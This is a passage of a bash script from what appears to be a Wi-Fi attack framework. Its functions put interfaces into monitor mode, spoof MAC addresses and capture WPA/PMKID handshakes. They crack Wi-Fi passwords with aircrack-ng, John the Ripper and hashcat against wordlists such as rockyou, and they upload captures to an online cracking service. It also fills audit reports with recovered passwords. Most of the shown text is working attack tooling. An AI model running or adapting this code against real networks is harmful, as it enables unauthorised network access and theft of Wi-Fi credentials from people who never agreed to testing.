  sed -i "s|{{CHANNEL}}|${channel}|g" "${reports_path}/${report_name}.html"
  sed -i "s|{{SECURITY}}|${ap_security}|g" "${reports_path}/${report_name}.html"
  sed -i "s|{{CLIENTS}}|${number_of_clients}|g" "${reports_path}/${report_name}.html"
  sed -i "s|{{EXECUTED_ATTACK}}|${type_of_attack}|g" "${reports_path}/${report_name}.html"

  if [ -f "${output_path}/${ap_dir}/${cap_name}.cap" ]; then
    sed -i "s|{{HS_FILE}}|${output_path}/${ap_dir}/${cap_name}.cap|g" "${reports_path}/${report_name}.html"
  else
    sed -i "s|{{HS_FILE}}|No capture was made|g" "${reports_path}/${report_name}.html"
  fi

  # Check if handshake was captured
  if [ "$(check_wpa_handshake "${output_path}/${ap_dir}/${cap_name}.cap")" == "true" ]; then
    sed -i "s/{{HS_STATUS}}/Captured/g" "${reports_path}/${report_name}.html"
  else
    sed -i "s/{{HS_STATUS}}/Not captured/g" "${reports_path}/${report_name}.html"
  fi

  # Check if the password was found using WPS attacks
  if [ -f "${cache_path}/reaver_output.txt" ] && [ "$(cat "${cache_path}/reaver_output.txt" | grep -i "${ap_bssid}")" ] && [ "$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')" ]; then
    sed -i "s/{{CONCLUSION}}/The target network is using ${ap_security} encryption, and it was found to have WPS enabled. Using a Pixie Dust attack, we were able to recover the PIN code and gain access to the network.\nIt is highly recommended to disable WPS functionality on the router immediately. A strong password should be used, and WPA3 encryption should be considered to prevent potential future vulnerabilities./g" "${reports_path}/${report_name}.html"

  elif [ "${ap_security}" == "WEP" ]; then # Check if AP is using WEP
    sed -i "s/{{CONCLUSION}}/The network is highly insecure. The target access point is broadcasting without encryption, making all transmitted data visible to anyone within range. This allows attackers to easily monitor traffic, capture credentials, and perform man-in-the-middle attacks.\nIt is strongly recommended to immediately enable WPA2 or WPA3 encryption with a strong password. An unsecured network exposes all connected devices to significant risks. Consider enabling additional security measures such as VPNs or using firewalls for connected devices./g" "${reports_path}/${report_name}.html"

  elif [ "$(check_wpa_handshake "${output_path}/${ap_dir}/${cap_name}.cap")" == "true" ]; then # Check if it contains a handshake
    sed -i "s/{{CONCLUSION}}/The target network is using ${ap_security} encryption, which is vulnerable to certain types of attacks, especially if weak passwords are used. During the audit, we were able to capture the WPA handshake, the password could be obtained by performing a dictionary-based attack.\nImmediate action is recommended: change the Wi-Fi password to a strong, randomly generated one with at least 16 characters. Additionally, consider upgrading to WPA3 encryption for enhanced security./g" "${reports_path}/${report_name}.html"

  elif [ -f "${cache_path}/wacker_output.txt" ] && [ "$(cat "${cache_path}/wacker_output.txt" | grep -i "${ap_bssid}")" ] && [ "$(cat "${cache_path}/wacker_output.txt" | grep "Found the password:")" ]; then
    sed -i "s/{{CONCLUSION}}/The target network is using ${ap_security} encryption. During the audit, we were able to find the WPA password using a dictionary-based attack.\nImmediate action is recommended: change the Wi-Fi password to a strong, randomly generated one with at least 16 characters./g" "${reports_path}/${report_name}.html"

 elif [ -f "${cache_path}/wacker_output.txt" ] && [ ! "$(cat "${cache_path}/wacker_output.txt" | grep "Found the password:")" ]; then
    sed -i "s/{{CONCLUSION}}/The target network is using ${ap_security} encryption. During the audit, we were not able to find the WPA password using a dictionary-based attack./g" "${reports_path}/${report_name}.html"

  else
    sed -i "s/{{CONCLUSION}}/During the audit, an attempt was made to capture the WPA handshake to test the network’s password security. However, despite multiple efforts, the handshake could not be successfully captured. This may be due to a variety of factors, such as low traffic on the network, the network not being actively used during the capture attempt, or certain security measures that prevent the handshake from being transmitted./g" "${reports_path}/${report_name}.html"
  fi

  # Replace password
  if [ -f "${cache_path}/reaver_output.txt" ] && [ "$(cat "${cache_path}/reaver_output.txt" | grep -i "${ap_bssid}")" ] && [ "$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')" ]; then
    sed -i "s/{{PASSWORD}}/$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')/g" "${reports_path}/${report_name}.html"
  elif [ -f "${cache_path}/wacker_output.txt" ] && [ "$(cat "${cache_path}/wacker_output.txt" | grep "Found the password:")" ] && [ "$(cat "${cache_path}/wacker_output.txt" | grep -i "${ap_bssid}")" ]; then
    sed -i "s/{{PASSWORD}}/$(cat "${cache_path}/wacker_output.txt" | grep "Found the password:" | awk -F"'" '{print $2}')/g" "${reports_path}/${report_name}.html"
  else
    sed -i "s/{{PASSWORD}}/Not obtained/g" "${reports_path}/${report_name}.html"
  fi
}

function parse_info(){
  aps="$(cat ${cache_path}/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"
  aps_length="$(echo "${aps}" | wc -l)"

  if [ -f "${cache_path}/airodump-01.csv" ] && [[ $number -le $aps_length ]]; then
    essid=$(cat ${cache_path}/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | tail -n +2 | sed "${number}q;d" | rev | cut -d "," -f1 | rev | sed 's/^[[:blank:]]*//')
    ap_bssid="$(echo "${aps}" | sed "${number}q;d" | awk '{print $1}')"
    channel=$(echo "${aps}" | sed "${number}q;d" | awk '{print $2}')
    ap_security="$(echo "${aps}" | sed "${number}q;d" | awk '{print $4}')"
    number_of_clients="$(cat "${cache_path}/airodump-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7- -d, | sed 's/# packets/Packets/' | tail -n +2 | grep -i "${ap_bssid}" | wc -l)"

    cap_name="$(get_date)"

    if [[ $channel -le 14 ]]; then
      pmkid_channel="${channel}a"
    elif [[ $channel -gt 14 ]]; then
      pmkid_channel="${channel}b"
    fi
  fi
}

function channel_to_freq() {
  local channel=$1
  local freq=0

  if (( channel >= 1 && channel <= 14 )); then
    # 2.4 GHz band
    if (( channel == 14 )); then
      freq=2484
    else
      freq=$((2407 + channel * 5))
    fi
  elif (( channel >= 36 && channel <= 165 )); then
    # 5 GHz band (includes DFS and upper band)
    freq=$((5000 + channel * 5))
  else
    echo "Unsupported or invalid channel: $channel"
    return 1
  fi

  echo "${freq}"
}

# Example: 00:C0:CA:B0:23:84
function get_vendor_by_mac(){
  mac_to_identify="$(echo "${1}" | tr '[:lower:]' '[:upper:]' | tr "-" ":")" # convert possible 00-C0-CA-B0-23-84 format to 00:C0:CA:B0:23:84

  oui=$(echo "$mac_to_identify" | awk -F: '{print toupper($1) toupper($2) toupper($3)}')
  found_vendor=$(grep -i "^$oui" "${wef_path}/oui.txt" | awk -F'\t' '{print $3}')

  if [[ -n "$found_vendor" ]]; then
    echo "$found_vendor" | sed 's/\r//g'
  else
    echo "unknown" | sed 's/\r//g'
  fi
}

function print_chipset(){
  if [ "$(check_interface_mode)" == "monitor" ]; then
    status "Chipset: ${greenC}${chipset}${endC}"
  else
    status "Chipset: ${greenC}${chipset}${endC}"
  fi
}

function check_vif(){
  iw list | grep "Supported interface modes" -A 8 | grep "AP/VLAN"
}

function get_active_interface(){
  if [ "${monitor_interface}" ] && [ -d "/sys/class/net/${monitor_interface}" ]; then
    echo "${monitor_interface}"
  elif [ -d "/sys/class/net/${managed_interface}" ]; then
    echo "${managed_interface}"
  fi
}

# Check the interface mode
function check_interface_mode(){
  iw dev "$(get_active_interface)" info 2>/dev/null | grep 'type' | awk '{print $2}'
}

# Check if the supplied command needs monitor mode
function check_if_monitor_is_needed(){
  found="no"

  for word in "${monitor_mode_needed_functions[@]}"; do
    if [ "${1}" == "${word}" ]; then
      found="yes"
    fi
  done
  
  echo "$found"
}

# Check if given file contains at least one valid WPA handshake
function check_wpa_handshake(){
  handshake_out="$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")"

  if [ "${handshake_out}" ] && [ "${handshake_out}" != "0" ]; then
    echo "true"
  else
    echo "false"
  fi
}

# Check if given file contains a valid PMKID handshake
function check_pmkid_handshake(){
  if [ "$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep "PMKID")" ]; then
    echo "true"
  else
    echo "false"
  fi
}

# Return the number of WPA handshakes in a file
function get_wpa_handshakes_in_file(){
  handshake_out="$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")"

  if [ "${handshake_out}" ]; then
    echo "${handshake_out}"
  else
    echo "0"
  fi
}

function get_target_wpa_handshakes_in_file(){
  handshake_out="$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep -i "${ap_bssid}" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")"
  
  if [ "${handshake_out}" ]; then
    echo "${handshake_out}"
  else
    echo "0"
  fi
}

# Check if at least 1 handshake has been captured
function check_captured_handshakes(){
  file_to_check="${cache_path}/${cap_name}-01.cap"

  if [ "$(check_wpa_handshake "${file_to_check}")" == "true" ] && [ "$(check_pmkid_handshake "${file_to_check}")" == "false" ]; then
    if [ "$lang" == "en" ]; then
      success "$(get_wpa_handshakes_in_file "${file_to_check}") WPA handshakes captured"
    else
      success "$(get_wpa_handshakes_in_file "${file_to_check}") handshakes WPA han sido capturados"
    fi
  elif [ "$(check_wpa_handshake "${file_to_check}")" == "false" ] && [ "$(check_pmkid_handshake "${file_to_check}")" == "true" ]; then
    if [ "$lang" == "en" ]; then
      success "No WPA handshake was captured but a PMKID handshake was captured"
    else
      success "No se capturó ningún handshake WPA pero si se capturó un handshake PMKID"
    fi
  elif [ "$(check_wpa_handshake "${file_to_check}")" == "true" ] && [ "$(check_pmkid_handshake "${file_to_check}")" == "true" ]; then
    if [ "$lang" == "en" ]; then
      success "$(get_wpa_handshakes_in_file "${file_to_check}") WPA handshake captured, PMKID handshake has been captured too"
    else
      success "$(get_wpa_handshakes_in_file "${file_to_check}") handshakes WPA han sido capturados, el handshake PMKID ha sido capturado también"
    fi
  elif [ "$(check_wpa_handshake "${file_to_check}")" == "false" ] && [ "$(check_pmkid_handshake "${file_to_check}")" == "false" ]; then
    if [ "$lang" == "en" ]; then
      failed "No WPA or PMKID handshakes were captured"
    else
      failed "Ningún handshake WPA o PMKID ha sido capturado"
    fi
  fi
}

function check_handshakes_online(){
  if [ "${wpa_sec_key}" ]; then
    curl -s -X GET "https://wpa-sec.stanev.org/?api&dl=1" -H "Cookie: key=${wpa_sec_key}" -o "${cache_path}/wpa-sec.founds.potfile"

    if [ "$(cat "${cache_path}/wpa-sec.founds.potfile")" ]; then
      echo
      cat "${cache_path}/wpa-sec.founds.potfile"
    else
      if [ "$lang" == "en" ]; then
        info_ln "You have not submitted any handshake or they have not been cracked"
      else
        info_ln "No has subido ningun handshake o no han sido crackeados"
      fi
    fi
    remove_file "${cache_path}/wpa-sec.founds.potfile"
  else
    if [ "$lang" == "en" ]; then
      warning_ln "You have not configured a valid wpa-sec key in the config file. Go to https://wpa-sec.stanev.org/ to obtain your own key"
    else
      warning_ln "No has configurado una clave válida de wpa-sec en el archivo de configuracion. Ve a https://wpa-sec.stanev.org/ para obtener tu propia clave"
    fi
  fi
}

function print_available_handshakes(){
  target="$(echo "1" | aircrack-ng "${1}" | grep "WPA")"

  if [ "$(echo "${target}" | wc -l)" -gt 1 ]; then
    echo -e "\n${target}" | sed 's/^....//'
  else
    if [ "$lang" == "en" ]; then
      if [ $(check_wpa_handshake "${1}") == "true" ]; then
        success_ln "File contains $(get_wpa_handshakes_in_file "${1}") WPA handshakes"
      else
        failed_ln "File contains no WPA handshakes"
      fi

      if [ "$(check_pmkid_handshake "${1}")" == "true" ]; then
        success "File contains at least one PMKID handshake"
      else
        failed "File contains no PMKID handshake"
      fi
    else
      if [ $(check_wpa_handshake "${1}") == "true" ]; then
        success_ln "El archivo contiene $(get_wpa_handshakes_in_file "${1}") handshakes WPA"
      else
        failed_ln "El archivo no tiene ningun handshake WPA"
      fi

      if [ "$(check_pmkid_handshake "${1}")" == "true" ]; then
        success "El archivo contiene al menos un handshake PMKID"
      else
        failed "El archivo no contiene ningún handshake PMKID"
      fi
    fi
  fi
}

function create_graph_file(){
  if [ ! -d "${graphs_path}" ]; then
    mkdir "${graphs_path}"
  fi

  if [ "$(command -v airgraph-ng)" ]; then
    airgraph-ng -g CAPR -i "${1}" -o "${2}" &>/dev/null &
    sleep 0.2

    if [ "$lang" == "en" ]; then
      info "Graph saved as ${2}"
    else
      info "Gráfico guardado como ${2}"
    fi; sleep 0.2
  else
    if [ "$lang" == "en" ]; then
      warning "airgraph-ng is not installed, make sure to install it in order to generate the graphs"
    else
      warning "airgraph-ng no está instalado, instalalo para poder crear los gráficos"
    fi
  fi
}

function export_dir(){
  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    export ap_dir="${essid}_${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    export ap_dir="${ap_bssid}"
  fi
}

# Create given directory if it does not exist
function check_and_create(){
  if [ ! -d "${1}" ]; then
    mkdir "${1}" 2>/dev/null
  fi
}

# Delete given file if it exists
function remove_file(){
  if [ "${1}" ]; then
    if [ -f "${1}" ]; then
      rm "${1}" 2>/dev/null
    fi
  fi
}

function create_dir(){
  export_dir

  check_and_create "${output_path}/${ap_dir}"
}

# Move network capture to output directory
function move_network_capture(){
  create_dir

  cp "${cache_path}/${cap_name}-01.cap" "${output_path}/${ap_dir}/${cap_name}.cap"
}

# Sets some important variables to "" (empty) to avoid errors and more
function reset_info(){
  # Empty attack-related variables
  essid=""
  ap_bssid=""
  channel=""
  ap_security=""
  pmkid_channel=""
  attack_time=""
  number=""
  client_number=""
  number_of_clients=""

  c_h=""
  c_i=""
  frames_to_send=""
  catch_handshakes=""
  crack_option=""
  wordlist_to_use=""
  cap_name=""
  ctrl_c_pressed=""
  wps_enabled=""
  attack_success=""
  password_obtained=""
  wpa_handshake_captured=""
  pmkid_handshake_captured=""
  stop_pwnagotchi=""
  ap_dir=""
  report_name=""
  portal_to_use_path=""
}

function list_interfaces(){
  echo -e "\n${blueC}Available interfaces:${endC}"
  for i in /sys/class/net/*; do
    echo -e "\t${grayC}$(echo "${i}" | awk '{print $NF}' FS="/")${endC}"
  done
}



#
# Functions related to network interface info (MAC, mode, frequencies...) and enabling/disabling monitor mode
#

# Check if interface is in managed or monitor mode
function print_interface_mode(){
  mode=$(check_interface_mode)

  if [ "${mode}" ]; then
    # Check if the network adapter is in monitor mode or not
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}Interface mode: ${grayC}${mode}${endC}"
    else
      echo -e "${blueC}Modo de la interfaz: ${grayC}${mode}${endC}"
    fi
  else
    if [ "$lang" == "en" ]; then
      error "Interface mode not found (managed or monitor)"
    else
      error "El modo de la interfaz no se ha podido encontrar (managed o monitor)"
    fi

    # Show info to aid debugging
    error "managed_interface=${managed_interface}; monitor_interface=${monitor_interface}"
    error "mon_output:"
    echo "${mon_output}"

    exit_wef
  fi
}

function print_interface_mode_2() {
  if [ "$lang" == "en" ]; then
    status "Interface mode: ${greenC}$(check_interface_mode)${endC}"
  else
    status "Modo de la interfaz: ${greenC}$(check_interface_mode)${endC}"
  fi
}

# Print interface name, use green color for monitor mode and gray for managed mode
function print_interface_name(){
  if [ "$(get_active_interface)" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}Interface name: ${grayC}$(get_active_interface)${endC}"
    else
      echo -e "${blueC}Nombre de la interfaz: ${grayC}$(get_active_interface)${endC}"
    fi
  else
    if [ "$lang" == "en" ]; then
      error "Interface not found"
    else
      error "Interfaz no encontrada"
    fi
    
    # Show info to aid debugging
    error "managed_interface=${managed_interface}; monitor_interface=${monitor_interface}"
    error "mon_output:"
    echo "${mon_output}"

    exit_wef
  fi
}

function print_interface_name_2() {
  if [ "$(get_active_interface)" ]; then
    if [ "$lang" == "en" ]; then
      status "Interface name: ${greenC}$(get_active_interface)${endC}"
    else
      status "Nombre de la interfaz: ${greenC}$(get_active_interface)${endC}"
    fi
  fi
}

# Print MAC address
function print_mac_address(){
  if [ "${current_mac}" ] && [ "${current_mac}" == "${permanent_mac}" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}MAC address: ${grayC}${current_mac} ${current_vendor}${endC}"
    else
      echo -e "${blueC}Dirección MAC: ${grayC}${current_mac} ${current_vendor}${endC}"
    fi

  elif [ "${current_mac}" ] && [ "${current_mac}" != "${permanent_mac}" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}Current MAC address: ${grayC}${current_mac} ${current_vendor}${endC}"
      echo -e "${blueC}Permanent MAC address: ${grayC}${permanent_mac} ${permanent_vendor}${endC}"
    else
      echo -e "${blueC}Dirección MAC actual: ${grayC}${current_mac} ${current_vendor}${endC}"
      echo -e "${blueC}Dirección MAC permanente: ${grayC}${permanent_mac} ${permanent_vendor}${endC}"
    fi

  else
    if [ "$lang" == "en" ]; then
      error_ln "An error has ocurred while getting MAC address"
    else
      error_ln "Ha ocurrido un error al obtener la dirección MAC"
    fi

    # Show info to aid debugging
    error "managed_interface=${managed_interface}; monitor_interface=${monitor_interface}"
    error "mon_output:"
    echo "${mon_output}"

    exit_wef
  fi 
}

function print_mac_address_2() {
  if [ "${current_mac}" == "${permanent_mac}" ]; then
    if [ "$lang" == "en" ]; then
      status "MAC address: ${greenC}${current_mac} ${current_vendor}${endC}"
    else
      status "Dirección MAC: ${greenC}${current_mac} ${current_vendor}${endC}"
    fi
  else
    if [ "$lang" == "en" ]; then
      status "Current MAC address: ${greenC}${current_mac} ${current_vendor}${endC}"
      status "Permanent MAC address: ${greenC}${permanent_mac} ${permanent_vendor}${endC}"
    else
      status "Dirección MAC actual: ${greenC}${current_mac} ${current_vendor}${endC}"
      status "Dirección MAC permanente: ${greenC}${permanent_mac} ${permanent_vendor}${endC}"
    fi
  fi
}

# Print interface frequencies band (2.4GHz, 5GHz or both)
function print_freq_band(){
  out=$(iw list | grep -A 10 'Frequencies:')

  if [ "$lang" == "en" ]; then
    if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
      status "Frequency: ${greenC}2.4GHz${endC}"

    elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
      status "Frequencies: ${greenC}2.4GHz and 5GHz${endC}"

    else
      status "Frequency: ${greenC}5GHz${endC}"
    fi

  else
    if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
      status "Frecuencia: ${greenC}2.4GHz${endC}"

    elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
      status "Frecuencias: ${greenC}2.4GHz y 5GHz${endC}"

    else
      status "Frecuencia: ${greenC}5GHz${endC}"
    fi
  fi
}

# Print wether the network adapter supports VIF or not
function print_vif(){
  if [ "$(check_vif)" ]; then
    if [ "$lang" == "en" ]; then
      status "Your network adapter seems to support VIF (Virtual Interface)"
    else
      status "Tu adaptador de red parece soportar VIF (Virtual Interface)"
    fi
  else
    if [ "$lang" == "en" ]; then
      warning "Your network adapter does not seem to support VIF (Virtual Interface)"
    else
      warning "Tu adaptador de red no soporta VIF (Virtual Interface)"
    fi
  fi
}

# Enable monitor mode
function enable_mon(){
  # Function enters here if you haven't enabled monitor mode
  if [ "$(check_interface_mode)" != "monitor" ]; then
    if [ "$lang" == "en" ]; then
      info "Enabling monitor mode for ${managed_interface} interface..."
    else
      info "Activando el modo monitor para la interfaz ${managed_interface}..."
    fi

    if [ "${airmon_check_kill}" == "true" ]; then
      airmon-ng check kill &>/dev/null
    fi

    # Get available interfaces
    before_list=($(iw dev | awk '/Interface/ {print $2}'))

    # Enable monitor mode
    airmon-ng start "${managed_interface}" &>/dev/null
    
    # Get available interfaces
    after_list=($(iw dev | awk '/Interface/ {print $2}'))

    monitor_interface=""
    for iface in "${after_list[@]}"; do
      if [[ ! " ${before_list[*]} " =~ " $iface " ]]; then
        monitor_interface="$iface"
        break
      fi
    done

    # Check if there was no change (interfaces were the same which could indicate that the name has not changed)
    if [ ! "${monitor_interface}" ]; then
      if [ "$(iw dev "${managed_interface}" info 2>/dev/null | grep 'type' | awk '{print $2})" == "monitor" ]; then
        monitor_interface="${managed_interface}"
      fi
    fi

    #echo -e "before_list: $before_list"
    #echo -e "after_list: $after_list"

    # Evil Twin interface is the same as the managed
    evil_twin_interface="${managed_interface}"

    ip link set "${monitor_interface}" up 2>/dev/null
    export monitor_interface managed_interface evil_twin_interface

    if [ "$lang" == "en" ]; then
      success "Monitor mode enabled"
    else
      success "Modo monitor activado"
    fi

    if [ "${managed_interface}" != "${monitor_interface}" ] && [ "$input" ]; then
      if [ "$lang" == "en" ]; then
        status "Interface name has changed from ${managed_interface} to ${monitor_interface}"
      else
        status "El nombre de la interfaz ha cambiado de ${managed_interface} a ${monitor_interface}"
      fi
    fi

    # Workaround for some weird interfaces which change its name radically after enabling monitor mode (i.e. from wlan0 to wlx00c0ca9208dc)
    if [ ! -d "/sys/class/net/${managed_interface}" ] && [ ! -d "/sys/class/net/${monitor_interface}" ]; then
      ask_new_name
    fi
  fi
}

# Disable monitor mode and enable managed mode
function disable_mon(){
  if [ "$lang" == "en" ]; then
    info_ln "Disabling monitor mode..."
  else
    info_ln "Desactivando el modo monitor..."
  fi

  if [ "${pmkid_running}" == "true" ]; then
    # Disable monitor mode manually with iw
    ip link set "${managed_interface}" down 2>/dev/null
    iw "${managed_interface}" set type managed 2>/dev/null
  else
    airmon-ng stop "${monitor_interface}" &>/dev/null
  fi

  sleep 0.1
  ip link set "${managed_interface}" up 2>/dev/null

  monitor_interface="${managed_interface}"

  if [ "$lang" == "en" ]; then
    success "Monitor mode disabled"
  else
    success "Modo monitor desactivado"
  fi
}

# Change MAC address
function randomize_mac(){
  echo
  if [ "$lang" == "en" ]; then
    input_no_line "MAC address to replace the current one with (default=random address): " mac_to_change
  else
    input_no_line "Dirección MAC con la que reemplazar la actual (por defecto=direccion aleatoria): " mac_to_change
  fi

  # Turn off the interface
  ip link set "${monitor_interface}" down 2>/dev/null

  if [ ! "${mac_to_change}" ]; then
    # Randomize the mac address
    macchanger -a ${monitor_interface} &>/dev/null
  else
    macchanger -m ${mac_to_change} ${monitor_interface} &>/dev/null
  fi

  if [ "$lang" == "en" ]; then
    success "MAC address changed successfully"
  else
    success "Dirección MAC cambiada correctamente"
  fi

  # Activate again the interface
  ip link set "${monitor_interface}" up 2>/dev/null
}





#
# Handshake related functions
#

function launch_cracking_process(){
  if [ "$capture_file" ] && [ "$wordlist_to_use" ]; then
    if [ "$wordlist_to_use" == "rockyou" ]; then
      wordlist_to_use="${rockyou_path}"
    elif [ "$wordlist_to_use" == "darkweb2017-top10000" ]; then
      wordlist_to_use="${dark2017_path}"
    elif [ "$wordlist_to_use" == "probable-v2-wpa-top4800" ]; then
      wordlist_to_use="${probable_wpa_path}"
    fi

    if [ "${1}" == "john" ]; then
      crack_handshake_john "${capture_file}"
    elif [ "${1}" == "hashcat" ]; then
      crack_handshake_hashcat "${capture_file}"
    elif [ "${1}" == "aircrack" ]; then
      crack_handshake_aircrack "${capture_file}"
    fi
  else
    if [ "$lang" == "en" ]; then
      info_ln "Usage example: ${1} /path/to/capture.cap /path/to/wordlist.txt"
    else
      info_ln "Ejemplo de uso: ${1} /ruta/de/la/captura.cap /ruta/del/diccionario.txt"
    fi
  fi
}

# Main default cracking function
function crack_handshake(){
  #if [ "$(get_target_wpa_handshakes_in_file "${1}")" -le 0 ] && [ "$(check_pmkid_handshake "${1}")" != "true" ]; then
  if [ "$(check_wpa_handshake "${1}")" != "true" ] && [ "$(check_pmkid_handshake "${1}")" != "true" ]; then
    if [ "$lang" == "en" ]; then
      failed_ln "File contains no handshakes"
    else
      failed_ln "El archivo no contiene handshakes"
    fi

    return
  fi

  trap ctrl_c INT

  ask_wordlist
  if [ "$dic_option" == "back" ]; then
    return
  fi
  
  ask_cracking_method "${1}"

  ask_to_exit
}

# Crack WPA handshake(s) with aircrack-ng
function crack_handshake_aircrack(){
  if [ -f "${1}" ]; then
    if [ "$(check_wpa_handshake "${1}")" == "false" ] && [ "$(check_pmkid_handshake "${1}")" != "true" ]; then
      if [ "$lang" == "en" ]; then
        warning "File contains no handshakes"
      else
        warning "El archivo no contiene handshakes"
      fi

      return
    fi

    if [ "$lang" == "en" ]; then
      info_ln "Press Ctrl+C to stop aircrack-ng\n"
    else
      info_ln "Presiona Ctrl+C para parar aircrack-ng\n"
    fi; sleep 1.5

    trap crack_c INT

    # Append "tee" so that the command stops with Ctrl+C (I dont know why, but works)
    aircrack-ng -w "${wordlist_to_use}" "${1}" | tee

    log_cracking_completed
  else
    log_handshakes_not_found
  fi
}

# Crack WPA handshake(s) with john
function crack_handshake_john(){
  if [ -f "${1}" ]; then
    if [ "$(check_wpa_handshake "${1}")" == "false" ]; then
      if [ "$lang" == "en" ]; then
        warning "File contains no handshakes"
      else
        warning "El archivo no contiene handshakes"
      fi

      return
    fi

    remove_file "${cache_path}/handshake.jtr" 2>/dev/null

    trap crack_c INT

    # Convert to a crackeable format
    wpapcap2john "${1}" > "${cache_path}/handshake.jtr" 2>/dev/null
    sleep 0.5

    if [ "$lang" == "en" ]; then
      info "Press Ctrl+C to stop JohnTheRipper\n"
    else
      info "Presiona Ctrl+C para parar JohnTheRipper\n"
    fi; sleep 1.5

    john --wordlist="${wordlist_to_use}" "${cache_path}/handshake.jtr"
    echo

    log_cracking_completed
  else
    log_handshakes_not_found
  fi
}

# Crack WPA handshake(s) with hashcat
function crack_handshake_hashcat(){
  if [ -f "${1}" ]; then

    if [ "$(file "${1}" | grep "cap capture file")" ]; then
      if [ "$(check_wpa_handshake "${1}")" == "false" ]; then
        if [ "$lang" == "en" ]; then
          warning "File contains no handshakes"
        else
          warning "El archivo no contiene handshakes"
        fi

        return
      fi

      remove_file "${cache_path}/hashcat_hashes.txt"

      # Convert hashes to readable hashcat format
      hcxpcapngtool -o "${cache_path}/hashcat_hashes.txt" "${1}" &>/dev/null

      if [ -f "${cache_path}/hashcat_hashes.txt" ] && [ "$(wc -l "${cache_path}/hashcat_hashes.txt" | awk '{print $1}')" -gt 0 ]; then
        if [ "$lang" == "en" ]; then
          info "Press Ctrl+C to stop hashcat"
        else
          info "Presiona Ctrl+C para parar hashcat"
        fi

        # Crack hashes with hashcat
        hashcat -m 22000 "${cache_path}/hashcat_hashes.txt" "${wordlist_to_use}"
        echo

        log_cracking_completed
      else
        if [ "$lang" == "en" ]; then
          warning_ln "No handshakes available to crack"
        else
          warning_ln "No hay handshakes disponibles para crackear"
        fi
      fi
    elif [ "$(file "${1}" | grep "ASCII text")" ]; then
      if [ "$(wc -l "${1}" | awk '{print $1}')" -gt 0 ]; then
        if [ "$lang" == "en" ]; then
          info_ln "Press Ctrl+C to stop hashcat"
        else
          info_ln "Presiona Ctrl+C para parar hashcat"
        fi

        # Crack hashes with hashcat
        hashcat -m 22000 "${1}" "${wordlist_to_use}"
        echo

        log_cracking_completed
      else
        if [ "$lang" == "en" ]; then
          warning_ln "No handshakes available to crack"
        else
          warning_ln "No hay handshakes disponibles para crackear"
        fi
      fi
    else
      if [ "$lang" == "en" ]; then
        error_ln "Invalid handshakes file format"
      else
        error_ln "Formato del archivo de handshakes incorrecto"
      fi
    fi

  else
    log_handshakes_not_found
  fi
}

function crack_handshake_online(){
  wpa_sec_key="$(awk -F "=" '/wpa_sec_key/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " ")"

  if [ "${wpa_sec_key}" ]; then
    if [ -f "${1}" ]; then

      # Check if given file is a network capture
      tcpdump -r "${1}" -c 1 > /dev/null 2>&1

      if [ $? -eq 0 ]; then
        if [ "$lang" == "en" ]; then
          info_ln "Uploading ${1} to wpa-sec..."
        else
          info_ln "Subiendo ${1} a wpa-sec..."
        fi; sleep 0.3

        # Upload file to wpa-sec
        curl -s -X POST "https://wpa-sec.stanev.org" -H "Cookie: key=${wpa_sec_key}" -F "file=@${1}" --max-time 30 &>/dev/null

        # Check if the operation succeded
        if [ "$(echo "$?")" -eq 0 ]; then
          if [ "$lang" == "en" ]; then
            success "The handshake has been uploaded successfully"
          else
            success "Se ha subido correctamente el handshake"
          fi
        else
          if [ "$lang" == "en" ]; then
            failed "The handshake has not been upload"
          else
            failed "No se ha podido subir el handshake"
          fi
        fi

      else
        if [ "$lang" == "en" ]; then
          warning_ln "File type is not supported. It must be a network capture file (.cap)"
        else
          warning_ln "El tipo de archivo no está soportado. Debe ser una captura de red (.cap)"
        fi
      fi
    else
      if [ "$lang" == "en" ]; then
        warning_ln "Provided file does not exist"
      else
        warning_ln "El archivo proporcionado no existe"
      fi
    fi
  else
    if [ "$lang" == "en" ]; then
      warning_ln "You have not configured a valid wpa-sec key in your config file. Go to https://wpa-sec.stanev.org/ to obtain your own key"
    else
      warning_ln "No has configurado una clave válida de wpa-sec en tu archivo de configuracion. Ve a https://wpa-sec.stanev.org/ para obtener tu propia clave"
    fi
  fi
}

# Crack PMKID handshake with hashcat
function crack_pmkid_handshake(){
  if [ -f "${1}" ] && [ "$(wc -l "${1}" | awk '{print $1}')" != "0" ]; then
    trap crack_c INT
    ask_wordlist
    if [ "$dic_option" == "back" ]; then
      return
    fi

    if [ "$lang" == "en" ]; then
      info_ln "Press Ctrl+C to stop hashcat\n"
    else
      info_ln "Presiona Ctrl+C para parar hashcat\n"
    fi; sleep 1.5

